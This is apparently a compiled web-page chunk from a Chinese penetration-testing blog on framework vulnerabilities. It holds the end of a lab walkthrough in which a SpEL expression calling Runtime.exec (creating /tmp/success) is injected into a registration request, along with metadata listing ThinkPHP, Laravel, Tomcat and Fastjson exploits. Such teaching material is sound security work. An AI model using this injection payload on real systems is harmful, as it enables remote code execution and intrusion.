noreferrer">http://47.113.187.190:22375/users</a> 就是users路径下</p><p>​<img src="'+Y+'" alt="image" loading="lazy">​</p></li><li><p>在该页面burpsuite抓包，因为有cookie所以不能直接粘贴整个请求包哦，，只需要把请求体内容替换即可。</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">username[</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/success&quot;)]=&amp;password=&amp;repeatedPassword=</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+X+'" alt="image" loading="lazy">​</p></li><li><p>在docker的/tmp目录下查看是否执行了命令，生成一个success文件。</p><p>docker exec -it a83bfec6f1a1 /bin/bash</p><p>​<img src="'+Q+'" alt="image" loading="lazy">​</p></li></ol>',78)]))}]]),as=JSON.parse('{"path":"/perm/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E.html","title":"框架漏洞","lang":"zh-CN","frontmatter":{"title":"框架漏洞","index":true,"icon":"bugs","isOriginal":true,"date":"2023-05-12T00:00:00.000Z","order":1,"category":["渗透测试"],"tag":["渗透测试","框架漏洞"],"description":"ThinkPHP ThinkPHP5 5.0.23 Remote Code Execution Vulnerability 其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。 访问页面 ​1​ 修改为POST 路径写为?s=captcha,, 多次B...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/blog/perm/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E.html"}],["meta",{"property":"og:site_name","content":"卷卷"}],["meta",{"property":"og:title","content":"框架漏洞"}],["meta",{"property":"og:description","content":"ThinkPHP ThinkPHP5 5.0.23 Remote Code Execution Vulnerability 其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。 访问页面 ​1​ 修改为POST 路径写为?s=captcha,, 多次B..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-12T08:22:33.000Z"}],["meta",{"property":"article:tag","content":"渗透测试"}],["meta",{"property":"article:tag","content":"框架漏洞"}],["meta",{"property":"article:published_time","content":"2023-05-12T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-12T08:22:33.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"框架漏洞\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-05-12T00:00:00.000Z\\",\\"dateModified\\":\\"2025-01-12T08:22:33.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"卷卷\\"}]}"]]},"headers":[{"level":2,"title":"ThinkPHP","slug":"thinkphp","link":"#thinkphp","children":[{"level":3,"title":"ThinkPHP5 5.0.23 Remote Code Execution Vulnerability","slug":"thinkphp5-5-0-23-remote-code-execution-vulnerability","link":"#thinkphp5-5-0-23-remote-code-execution-vulnerability","children":[]},{"level":3,"title":"ThinkPHP V5.0.20","slug":"thinkphp-v5-0-20","link":"#thinkphp-v5-0-20","children":[]}]},{"level":2,"title":"Laravel CVE-2021-3129     拉日尔沃","slug":"laravel-cve-2021-3129-拉日尔沃","link":"#laravel-cve-2021-3129-拉日尔沃","children":[]},{"level":2,"title":"tomcat","slug":"tomcat","link":"#tomcat","children":[{"level":3,"title":"CVE-2017-12615","slug":"cve-2017-12615","link":"#cve-2017-12615","children":[]},{"level":3,"title":"CVE-2020-1938","slug":"cve-2020-1938","link":"#cve-2020-1938","children":[]},{"level":3,"title":"tomcat8远程部署漏洞","slug":"tomcat8远程部署漏洞","link":"#tomcat8远程部署漏洞","children":[]}]},{"level":2,"title":"fastjson","slug":"fastjson","link":"#fastjson","children":[{"level":3,"title":"Fastjson反序列化漏洞","slug":"fastjson反序列化漏洞","link":"#fastjson反序列化漏洞","children":[]},{"level":3,"title":"使用dnslog回显","slug":"使用dnslog回显","link":"#使用dnslog回显","children":[]}]}],"git":{"createdTime":1736670153000,"updatedTime":1736670153000,"contributors":[{"name":"youze","username":"youze","email":"youze27@163.com","commits":1,"url":"https://github.com/youze"}]},"readingTime":{"minutes":9.01,"words":2703},"filePathRelative":"perm/漏洞专题/框架漏洞.md","localizedDate":"2023年5月12日","excerpt":"<table>\\n<thead>\\n<tr>\\n<th>漏洞名称</th>\\n<th>漏洞原理</th>\\n<th></th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td>ThinkPHP5.0.23 Remote Code Execution Vulnerability</td>\\n<td><span data-type=\\"text\\" style=\\"color: var(--b3-font-color8);\\">获取method的方法中没有正确处理方法名，</span>导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</td>\\n<td></td>\\n</tr>\\n<tr>\\n<td>Laravel CVE-2021-3129</td>\\n<td>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</td>\\n<td></td>\\n</tr>\\n</tbody>\\n</table>","autoDesc":true}')}}]);